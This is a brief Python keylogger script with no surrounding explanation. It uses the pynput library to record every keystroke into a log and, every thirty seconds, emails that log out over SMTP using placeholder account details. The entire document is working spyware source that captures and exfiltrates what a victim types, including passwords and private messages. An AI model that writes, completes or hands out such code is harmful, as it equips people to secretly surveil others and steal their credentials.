import pynput.keyboard
import smtplib
import threading

log = ""

def callback_func(key):
    global log
    try:
        log = log + key.char
    except AttributeError:
        log = log + str(key)

def send_mail():
    email_server = smtplib.SMTP("smtp.email.com",587)
    email_server.starttls()
    email_server.login("test@gmail.com","password")
    email_server.sendmail("test@gmail.com","test@gmail.com",log)
    email_server.quit()
    
def thread_func():
    send_mail()
    log = ""
    timer_object = threading.Timer(30,thread_func)
    timer_object.start()


listener = pynput.keyboard.Listener(on_press=callback_func)


with  listener:
    thread_func()
    listener.join()
